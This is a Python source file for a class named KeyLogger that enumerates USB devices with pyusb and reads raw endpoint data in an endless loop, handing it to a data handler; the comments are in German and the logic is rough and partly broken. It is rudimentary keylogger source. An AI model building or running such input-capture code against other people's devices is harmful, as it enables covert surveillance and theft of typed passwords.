import logging

import usb.core, usb.util
from src import DataHandler


class KeyLogger:
    __slots__ = ["__devices", "data_handler"]

    def __init__(self, data_handler: DataHandler) -> None:
        self.__devices = self.get_devices()
        self.data_handler = data_handler

    def __del__(self):
        pass

    @staticmethod
    def get_devices() -> list[[int, int]]:
        devices = usb.core.find(find_all=True)
        vendor_ids: list[(int, int)] = []
        # Enumerate over all USB devices
        for device in devices:
            try:
                tuple = device.idVendor, device.idProduct
                vendor_ids.append(tuple)
            except usb.core.USBError as e:
                print(f"Error reading Vendor ID: {e}")
        return vendor_ids

    # TODO: Rewrite this code
    def run(self):
        # Geräteinformationen
        for device in self.__devices:
            try:
                vendor_id: int = device[0]
                product_id: int = device[1]
                # USB-Gerät finden
                dev = usb.core.find(idVendor=vendor_id, idProduct=product_id)
                if dev is None:
                    raise ValueError("USB-Device not found")
                # USB-Gerät öffnen
                dev.set_configuration()
            except Exception as e:
                logging.error(f"Error reading Vendor ID: {e}")

        usb.util.claim_interface(dev, 0)
        try:
            # Endlosschleife zum Abhören des USB-Verkehrs
            while True:
                data = dev.read(0x81, 64)  # Endpoint-Adresse und Puffergröße anpassen
                # Hier können Sie mit den USB-Daten weiterarbeiten
                self.data_handler.write(data)
                print("Empfangene Daten: ", data)
        except KeyboardInterrupt:
            pass
        finally:
            usb.util.release_interface(dev, 0)
            dev.reset()


# if __name__ == "__main__":
#     key_logger = KeyLogger()
#     key_logger.run()
